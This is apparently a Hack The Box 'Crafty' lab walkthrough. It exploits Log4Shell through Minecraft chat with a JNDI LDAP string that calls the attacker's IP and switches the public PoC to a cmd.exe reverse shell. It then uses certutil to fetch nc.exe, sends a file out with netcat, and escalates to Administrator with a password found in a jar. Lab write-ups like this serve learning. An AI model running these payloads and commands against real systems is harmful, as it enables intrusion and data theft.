---
date: 2025-04-03
categories: [CTF, HTB]
title: "HTB - Crafty"
tags: ['ldap', 'linux', 'nmap', 'powershell', 'privilege escalation', 'python', 'rce', 'reverse shell', 'windows', 'minecraft']

description: "Crafty - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - Crafty

- NMAP

```bash
nmap 10.129.18.108 -Pn -p- -vv

```

![image1](../resources/2348de89026443d1a2151719e9194f0b.png)


![image2](../resources/22cbf939d17c489da10248ef960af600.png)

- Add crafty.htb to /etc/hosts

![image3](../resources/cd35b355587447c3940ccdaa292e1eb1.png)

- Subdomain enumeration:

```bash
wfuzz -u crafty.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.crafty.htb" --hl 1

```
- Download a Minecraft player - Tslauncher
- Run the .jar file and enter any username and choose the version
- Then install and enter game


![image4](../resources/a64c40c42b874113b433701dcfa080a4.png)

- Add server


![image5](../resources/eabc3d91c33e4c92a160fb8f20b90698.png)

- Join server

- Here is a POC log4j-shell for this version
[https://github.com/kozmer/log4j-shell-poc](https://github.com/kozmer/log4j-shell-poc)

[CVE-2021-44228 - Log4j - MINECRAFT VULNERABLE! (and SO MUCH MORE)](https://www.youtube.com/watch?v=7qoPDq41xhQ&t=1532s)

<https://github.com/pentesterland/Log4Shell>

- Clone the directory and cd into it

```bash
git clone https://github.com/kozmer/log4j-shell-poc

```
- Download jdk1.8 - and rename the folder to jdk1.8.0_20:

```bash
wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz

```

![image6](../resources/b46b34241e22412da02e3ffe1aed7646.png)

- Set up listener:

![image7](../resources/71521ef2a41e4916a070dbdb57f596c8.png)

- Run python script:

![image8](../resources/68b2cf81195444ceadc354bbb64a605a.png)

- Copy the string to send:

```bash
${jndi:ldap://10.10.14.38:1389/a}

```
- In the TSlauncher app - Press T to open the chat box
Paste in the code


![image9](../resources/c3eea277e0c24a118009299e65d233f5.png)

- We can see the GET requests from the webserver

![image10](../resources/46893a8a77214232847249d37e277ad2.png)

- But no shell

- Looking at the code:


![image11](../resources/74c4303464944f7a9a3a9cb1040a4bb9.png)

This is for a Linux server

- We need to change the payload for a Windows reverse shell:

![image12](../resources/2269a1a1c7b94a42875e35d9dec3f28d.png)

- Replace /bin/sh with cmd.exe - The IP and Port forwarding happens in the Java code itself

- Repeat the steps:
  - Set up listener
  - Run the python poc.py
  - Copy the command
  - Paste into minecraft chat

- Shell

![image13](../resources/75875bad84a7458f91e675134f30b51e.png)


![image14](../resources/a73dc94b611d4682aafc0ea6eb252377.png)

```bash
dir /Q /A

```

![image15](../resources/fa08f790e63c4dd9bf794153bb670c68.png)

- Found a .jar file

![image16](../resources/623a1da6f4314c86bb4ffb9824e179e4.png)

- We can't read it here so we need to transfer it to Kali

- Set up Python server

- Copy nc.exe over to the target:

`certutil.exe -urlcache -f http://10.10.14.38:8082/nc.exe c:\Users\svc_minecraft\Documents\nc.exe`


- Using nc we can send and receive:
  - On Kali:

```bash
nc -lnvp 4444 > playercounter-1.0-SNAPSHOT.jar

```
- On Windows:

```bash
c:\Users\svc_minecraft\Documents\nc.exe 10.10.14.38 4444 < playercounter-1.0-SNAPSHOT.jar

```
- **Ctrl+C on Kali** to stop the connection

![image17](../resources/2afd90148abb462db1414bc56bc70efc.png)


![image18](../resources/61b45372a37a40699d92303848612071.png)


![image19](../resources/650ad55a7f7f4c0dba8c1698e83cecdc.png)

- Reading the Java archive file:

```bash
jar tf <file.jar>:
```
![image20](../resources/473050f698774d32bdc4ed132f4646c6.png)

- Extract with:

```bash
jar xf <file.jar>
```

- That didn't extract anything useful and not all the files were there, as seen above

- Open the .jar file with a Java Decompiler JD-GUI:

![image21](../resources/faed98b62a334135b1b0456dfef230f1.png)
- We find a potential password

- Open Powershell and enter the following to open a new Powershell session as Admin:

```powershell
$User = "Administrator"
$Password = ConvertTo-SecureString "<Password>" -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential($User, $Password)
Start-Process cmd.exe -Credential $Credential
```

![image22](../resources/37e2e2bd470240299708cb4cab49acb7.png)


![image23](../resources/d022535dad4c40eebf79a4de54bb36cb.png)